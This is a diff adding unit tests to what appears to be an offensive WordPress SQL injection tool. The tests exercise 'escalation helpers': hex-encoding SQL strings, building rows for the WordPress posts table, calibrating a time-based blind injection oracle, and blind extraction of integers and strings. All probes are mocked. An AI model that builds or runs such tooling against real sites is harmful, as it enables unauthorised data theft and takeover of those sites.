@@ -420,6 +420,82 @@ class RouteShiftTests(unittest.TestCase):
                 self.assertNotIn(kw, q, f"{kw} in {query}")
 
 
+# ── Escalation helpers ──────────────────────────────────────────────
+
+class EscalationHelperTests(unittest.TestCase):
+    def test_sql_hex_simple(self):
+        self.assertEqual(ws._sql_hex("hello"), "0x68656c6c6f")
+
+    def test_sql_hex_empty(self):
+        self.assertEqual(ws._sql_hex(""), "''")
+
+    def test_post_row_structure(self):
+        row = ws._post_row(123, "content", "title", "publish",
+                           "slug", 0, "post")
+        parts = row.split(",")
+        self.assertEqual(len(parts), 23)
+        self.assertEqual(parts[0], "123")
+        self.assertEqual(parts[4], ws._sql_hex("content"))
+        self.assertEqual(parts[5], ws._sql_hex("title"))
+        self.assertEqual(parts[7], ws._sql_hex("publish"))
+        self.assertEqual(parts[11], ws._sql_hex("slug"))
+        self.assertEqual(parts[17], "0")
+        self.assertEqual(parts[20], ws._sql_hex("post"))
+
+    def test_post_row_has_proper_columns(self):
+        """All 23 columns must have values (no trailing comma issues)."""
+        row = ws._post_row(1, "c", "t", "draft", "n", 0, "page")
+        parts = row.split(",")
+        for i, p in enumerate(parts):
+            self.assertTrue(p, f"column {i} empty: {row}")
+
+    @mock.patch.object(ws, '_probetime')
+    def test_calibrate_timing_confirmed(self, mock_probe):
+        mock_probe.side_effect = lambda c, cond, sd: 0.05 if "1=0" in cond else 2.0
+        client = ws.BatchClient("http://target")
+        threshold, band = ws._calibrate_timing(client, 0.4)
+        self.assertIsNotNone(threshold)
+        self.assertGreater(threshold, 0.5)
+
+    @mock.patch.object(ws, '_probetime')
+    def test_calibrate_timing_not_vulnerable(self, mock_probe):
+        mock_probe.return_value = 0.05  # always fast
+        client = ws.BatchClient("http://target")
+        threshold, band = ws._calibrate_timing(client, 0.4)
+        self.assertIsNone(threshold)
+
+    @mock.patch.object(ws, '_probetime')
+    def test_timing_oracle_true(self, mock_probe):
+        mock_probe.return_value = 2.0  # slow → condition true
+        client = ws.BatchClient("http://target")
+        result = ws._timing_oracle(client, "1=1", 0.4, 1.0, 0.02)
+        self.assertTrue(result)
+
+    @mock.patch.object(ws, '_probetime')
+    def test_timing_oracle_false(self, mock_probe):
+        mock_probe.return_value = 0.05  # fast → condition false
+        client = ws.BatchClient("http://target")
+        result = ws._timing_oracle(client, "1=0", 0.4, 1.0, 0.02)
+        self.assertFalse(result)
+
+    @mock.patch.object(ws, '_probetime')
+    def test_blind_read_int_zero(self, mock_probe):
+        # Return fast for all probes → value is 0
+        mock_probe.return_value = 0.05
+        client = ws.BatchClient("http://target")
+        # With everything fast, binary search converges to 0
+        result = ws._blind_read_int(client, "SELECT 0", 0.4, 1.0, 0.02)
+        self.assertIsInstance(result, int)
+
+    @mock.patch.object(ws, '_probetime')
+    def test_blind_read_string_empty(self, mock_probe):
+        # Always fast → length=0 → empty string
+        mock_probe.return_value = 0.05
+        client = ws.BatchClient("http://target")
+        result = ws._blind_read_string(client, "SELECT ''", 64, 0.4, 1.0, 0.02)
+        self.assertEqual(result, "")
+
+
 class ColorTests(unittest.TestCase):
     def test_color_on(self):
         c = ws.C(on=True)
